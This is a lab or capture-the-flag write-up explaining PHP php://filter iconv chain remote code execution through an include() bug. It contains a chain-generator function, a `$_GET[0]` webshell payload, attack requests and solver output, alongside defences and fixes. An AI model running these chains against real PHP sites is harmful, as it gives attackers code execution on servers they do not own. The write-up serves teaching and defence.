# 12 — Filter Chain RCE — Writeup

## TL;DR

`php://filter` chains are a stream rewriter, and `convert.base64-decode`
skips anything that is not a base64 character. Converting *to*
`CSISO2022KR` prepends the charset designator `\x1b$)C`, of which only `C`
survives a base64 decode. Re-encode, strip the `=` padding with a UTF-7
conversion, and you have prepended one chosen character to a base64 string.
Longer iconv chains mangle `\x1b$)C` into the other 63 characters. Repeat
once per character, walking the target backwards, then decode once: the
stream now *starts* with `<?=`$_GET[0]`;;?>`, `include()` executes it, and
`/readflag` prints the flag. No file on the target is ever written.

Flag: `PHRACK{no_files_needed_iconv_wrote_the_webshell}`

## The bug

```php
$page = $_GET['page'] ?? 'pages/home.php';
...
include($page);
```

Everything else in this lab exists to remove the *classic* answers:

| defence | what it kills |
|---|---|
| `read_only: true` + root-owned tmpfs on `/tmp`, `/run` | any file write by the web user |
| `file_uploads = Off` | `/tmp/phpXXXXXX` RFC1867 temporaries (Gynvael, Brett Moore) |
| `session.upload_progress.enabled = Off` | lab 11 |
| `allow_url_fopen = Off`, `allow_url_include = Off` | RFI, `data://`, `http://` |
| `access.log`/`error.log` are symlinks to `/dev/stdout` and `/dev/stderr` | log poisoning |
| `/flag.txt` `0400 root:root`, setuid `/readflag` | plain file read of the flag |
| `/var/www/html` root-owned, `a-w` | overwriting the app |
| the same `read_only: true` | `pearcmd.php` + `register_argc_argv` (see below) — the file is *present* and *reachable*, it just has nowhere to write |

Checked from inside the running container as `www-data`: `/tmp`, `/var/tmp`,
`/dev/shm`, `/var/www/html`, `/var/log/apache2`, `/run`, `/var/run`, `/home`,
`/var/lib/php`, `/usr/local/lib/php` and `/` itself all refuse `touch`.

### One classic that is *not* removed, and why

`/usr/local/lib/php/pearcmd.php` ships with the official `php:*` images and
this lab does not delete it, and `register_argc_argv` is `On` (the default).
That is the whole precondition for the well-known PEAR trick: `include`ing
`pearcmd.php` gives it a command line built from the query string, and
`config-create` writes a file wherever you point it. It is genuinely reachable
here — PEAR runs, parses the arguments and tries the write:

```sh
$ curl -s 'http://127.0.0.1:8012/?page=/usr/local/lib/php/pearcmd.php&+config-create+/var/www/html/x+/tmp/pwn.php' | tail -1
Could not create "/tmp/pwn.php"
```

Every destination fails the same way — `/tmp`, `/var/tmp`, `/dev/shm`, `/run`,
`/var/www/html`, `/usr/local/lib/php` — because `read_only: true` plus
root-owned tmpfs mounts leave the web user nothing to write to. So this path is
closed by the compose file and by nothing else — worth stating plainly rather
than leaving a player to rediscover it, and worth its own row in the table
above so the dependency is not silent.

Deleting `pearcmd.php` in the Dockerfile would close it more directly, but it
would also make the image less like a stock PHP install, and the point of this
lab is that a *stock*, thoroughly hardened box still falls to the filter chain.

`php://` is not flagged `is_url` in PHP's wrapper table, so none of the
`allow_url_*` switches touch it. `php://filter` is always available.

## Building the exploit

### 1. The two primitives

**Removal.** `convert.base64-decode` (`php_conv_base64_decode_convert()` in
`ext/standard/filters.c`) looks each byte up in `base64_reverse_table`. Bytes
that are not in `A-Za-z0-9+/` are skipped; the survivors are consumed four at
a time.

**Prepending.** iconv conversions to stateful charsets emit the charset
designator before the first character. `CSISO2022KR` (ISO-2022-KR) always
starts with `ESC $ ) C`:

```
$ resource = data://text/plain,QUJDRA          # the base64 text "QUJDRA"

(raw resource)                         51 55 4a 44 52 41              "QUJDRA"
|convert.iconv.UTF8.CSISO2022KR        1b 24 29 43 51 55 4a 44 52 41  "\x1b$)CQUJDRA"
```

Of `\x1b`, `$`, `)`, `C`, only `C` is a base64 character.

### 2. One character, byte by byte

Take a stream that is already base64 text — `QUJDRA`, which decodes to
`ABCD`. Watch it through the four filters that make up one iteration:

| chain | bytes | as text |
|---|---|---|
| *(raw)* | `51 55 4a 44 52 41` | `QUJDRA` |
| `convert.iconv.UTF8.CSISO2022KR` | `1b 24 29 43 51 55 4a 44 52 41` | `\x1b$)CQUJDRA` |
| `…\|convert.base64-decode` | `09 05 09 0d 10` | *(binary)* |
| `…\|convert.base64-encode` | `43 51 55 4a 44 52 41 3d` | `CQUJDRA=` |
| `…\|convert.iconv.UTF8.UTF7` | `43 51 55 4a 44 52 41 2b 41 44 30 2d` | `CQUJDRA+AD0-` |

Read that third row carefully. The decoder saw `\x1b$)CQUJDRA`; it threw away
`\x1b`, `$` and `)`, and decoded `CQUJDRA` — seven characters, i.e. one full
group `CQUJ` plus `DRA`. The fourth row re-encodes that back to base64 text
and the result is *exactly the input with a `C` glued on the front*:
`CQUJDRA=`.

That is the whole trick. `base64_encode(base64_decode(X)) == X` (up to
padding) for base64 text `X`, so decoding-then-encoding is a no-op on our
payload while it lets the garbage from the iconv prefix evaporate.

The `=` that re-encoding introduces is not harmless: a later
`convert.base64-decode` treats `=` as a fatal conversion error and throws the
whole bucket away. `convert.iconv.UTF8.UTF7` escapes `=` as `+AD0-`; `+`, `A`,
`D`, `0` are base64 characters and `-` is not, so the `=` is gone and only
trailing noise remains — which never matters, because we only ever care about
the *head* of the stream.

Second iteration, with the chain for the character `8`:

```
…|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode
  |convert.base64-encode|convert.iconv.UTF8.UTF7      ->  "8CQUJDRA+-AD0"
```

`8`, then `C`, then the original text. Walking the wanted base64 string in
reverse therefore builds it in order.

### 3. The alphabet

`C` comes free. The other 63 characters need an iconv chain that turns
`\x1b$)C` into a byte sequence containing exactly one (different) base64
character. Finding them is a brute-force search over the ~1200 charset names
glibc ships, and that search is the community's work, not mine: @loknop found
the first handful, @wupco published the full dictionary
(`PHP_INCLUDE_TO_SHELL_CHAR_DICT`), and Rémi "Remsio" Matasse / Synacktiv
tidied it into the table everyone uses today. The generator in
`solve/solve.py` is written from scratch; the 64-entry `PREPEND` table is
theirs, credited above and in the references.

I re-checked every entry against the exact image this lab pins
(`php:8.2.33-apache`, Debian trixie, glibc 2.41) with this probe:

```php
$B = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5";   // 48 chars
foreach ($conv as $ch => $chain) {
    $f = "$chain|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7";
    $out = file_get_contents("php://filter/$f/resource=data://text/plain,$B");
    // expect: $ch . $B
}
```

Result, run against `php:8.2.33-apache`:

```
entries:            64
byte-identical:     0
equal on first 48:  63
output lengths:     {"48":63,"49":1}
differs at <48: '+' -> +-QUJDREVGR0hJSktMTU5PUF
'+' full output:    +-QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg
'C' full output:    CQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg
expected (C):       CQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5
```

So **63/64 match on the first 48 bytes**, and *none* is byte-identical to
`$ch . $B`. Two separate things are going on, and an earlier revision of this
writeup conflated them into a wrong "63/64 byte-identical":

* **Every** output is 48 bytes where `$ch . $B` is 49. The decoder is handed
  `$ch` plus 48 base64 characters = 49 characters = twelve complete groups plus
  one leftover, which decodes to 36 bytes; re-encoding 36 bytes gives 48
  characters, so the final `5` of `$B` never comes back. That is the probe
  losing a character, not the table being wrong — and it is irrelevant in the
  real chain, where only the *head* of the stream is ever used.
* `+` is the one entry that differs inside those 48 bytes: it comes back as
  `+-QUJD…` (49 bytes), because the trailing `convert.iconv.UTF8.UTF7` in the
  *probe* escapes the `+` we just injected. In the real chain the decode
  happens before that UTF-7 pass and `-` is skipped by every later decoder, so
  `+` is correct too; it is exercised end-to-end by the solver's stage-1 canary
  (`base64("<?=1337*3;?>") == "PD89MTMzNyozOz8+"`).

### 4. The generator

```python
def build_chain(payload, resource="php://temp"):
    wanted = base64.b64encode(payload).decode().rstrip("=")
    steps = ["convert.iconv.UTF8.CSISO2022KR",   # make sure the stream is non-empty
             "convert.base64-encode",            # …and that it is base64 text
             "convert.iconv.UTF8.UTF7"]          # …with no '=' in it
    for char in reversed(wanted):
        steps.append(PREPEND[char])              # push one character in front
        steps.append("convert.base64-decode")    # drop the iconv garbage
        steps.append("convert.base64-encode")    # back to base64 text
        steps.append("convert.iconv.UTF8.UTF7")  # kill the new '=' padding
    steps.append("convert.base64-decode")        # text -> bytes
    return "php://filter/" + "|".join(steps) + "/resource=" + resource
```

`resource=php://temp` is an empty, always-openable stream: the technique does
not need *any* file on the target, which is the point @loknop was making.

### 5. Fire

```
GET /?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|…
     |convert.base64-decode/resource=php://temp&0=/readflag
```

```
[*] target   http://challenge
[*] stage 1  sanity chain, 2490 bytes, 97 filters
[+] stage 1  the chain executed PHP that exists in no file
[*] stage 2  webshell chain, 3506 bytes, 138 filters
[+] `/readflag` ran as the web user
FLAG: PHRACK{no_files_needed_iconv_wrote_the_webshell}
```

138 filters, 3506 bytes of URL — comfortably under Apache's default
`LimitRequestLine` of 8190 (unchanged in this lab), so no server tuning was
needed. The payload is loknop's `` <?=`$_GET[0]`;;?> `` verbatim — 23 base64
characters, i.e. 23 iterations. The second `;` is just an empty statement; a
single `;` would in fact be one character shorter (22), so keeping `;;` costs
one extra iteration and is kept only for fidelity to the original.

### Choosing the PHP version

php-src issue **#10453**, "Limit maximum number of filter chains as a security
measure", was opened in January 2023 and sat open for two years. It has since
become the accepted RFC *"Limit maximum number of filter chains"* (30/0/2),
**implemented in PHP 8.6**: more than 16 filters in a chain raises a
deprecation in 8.6 and becomes an error in 8.7, configurable only through the
`filter.max_filter_count` stream context option (deliberately *not* an ini
setting). A 138-filter chain is dead on 8.6+.

This lab therefore pins `php:8.2.33-apache` — the last PHP 8.2 release, a
version where the technique works exactly as published. Verified on that image:
chains of 138 filters are accepted without complaint.

## The exploit

`solve/solve.py`, Python 3 standard library only:

1. `PREPEND` — the 64-entry character → iconv-chain table (credited above).
2. `build_chain()` — the generator shown in §4.
3. stage 1 sends a chain that synthesises `<?=1337*3;?>` and asserts `4011`
   appears in the response, which proves the chain machinery works before any
   command runs.
4. stage 2 sends a chain that synthesises `` <?=`$_GET[0]`;;?> `` and passes
   `0=/readflag`.

## Fixing it

```php
$allowed = ['home', 'about', 'notes'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed, true)) { http_response_code(404); exit; }
include __DIR__ . "/pages/$page.php";
```

* Allowlist. Nothing else works: this attack uses no traversal, no null byte,
  no extension trick, and no writable file, so every input-sanitising
  heuristic short of an allowlist misses it.
* If you truly must take a path, reject anything containing `://` before you
  touch the filesystem. `open_basedir` does not stop `php://filter`, and
  neither does a read-only root.
* On PHP 8.6+ set `filter.max_filter_count` (stream context) on any stream you
  open from user input; the default of 16 already breaks this attack.
* Disabling the `iconv` extension removes `convert.iconv.*` and with it the
  prepending primitive — at the cost of a widely used extension.

## Going further

* **Error-based file read.** Rémi Matasse turned the same chains into an
  oracle that leaks file contents through PHP error messages, no output
  channel required. *Not implemented here, not tested.*
* **`wrapwrap` / `lightyear`** (Charles "cfreal" Fol) generalise the technique
  to adding a chosen *prefix and suffix* around a file and to dumping PHP
  source through filters. *Not implemented, not tested.*
* **DownUnderCTF 2022 "minimal-php"** (@hashkitten) is the same primitives
  applied to `<?php file($_POST[0]);` — a sink with no output at all, so the
  chain has to be turned into a side channel rather than a writer. That is the
  article's Level 2, and it is `labs/13-filter-chain-oracle` in this repo, not
  this lab.
* **CVE-2024-2961** — the glibc `ISO-2022-CN-EXT` iconv buffer overflow, also
  reachable through `convert.iconv`, escalates a filter chain from "write PHP
  code" to "corrupt the PHP heap". The `E` entry of the table uses
  `convert.iconv.ISO-IR-143.ISO2022CNEXT`, so an unpatched glibc could crash on
  a payload containing `E`. The base64 of both payloads used here contains no
  `E`, and the pinned image's glibc 2.41 is patched. *Not exploited, not
  tested.*
* **What I could not reproduce.** Nothing in loknop's or Synacktiv's method
  failed on this image. The only divergences are the two probe artefacts
  described in §3 (every probe output is one character short, and `+` comes
  back escaped), both properties of the probe rather than of the chain.

## References

* @loknop, "Solving includer's revenge from hxp ctf 2021 without controlling
  any files" — <https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d>
* Gynvael Coldwind, "Surprising CTF task solution using php://filter" —
  <https://gynvael.coldwind.pl/?lang=en&id=671>
* Yuhang "wupco" Wu, `PHP_INCLUDE_TO_SHELL_CHAR_DICT` —
  <https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT>
* Rémi "Remsio" Matasse (Synacktiv), "PHP filters chain: What is it and how to
  use it" —
  <https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it>
  and the reference implementation
  <https://github.com/synacktiv/php_filter_chain_generator>
* Bruno "0xbb" Bierbaumer, "hxp CTF 2021: includer's revenge writeup" —
  <https://hxp.io/blog/90/hxp-CTF-2021-includers-revenge-writeup/>
* Rémi "Remsio" Matasse, "PHP filter chains: file read from error-based
  oracle" —
  <https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle>
* Charles "cfreal" Fol, "Introducing wrapwrap" —
  <https://blog.lexfo.fr/wrapwrap-php-filters-suffix.html>
* php-src issue #10453, "Limit maximum number of filter chains as a security
  measure" — <https://github.com/php/php-src/issues/10453> — and the resulting
  RFC <https://wiki.php.net/rfc/limit-maximum-number-of-filter-chains>
* Orange Tsai, "The Art of PHP - My CTF Journey and Untold Stories!",
  Phrack #72, section 4.1.
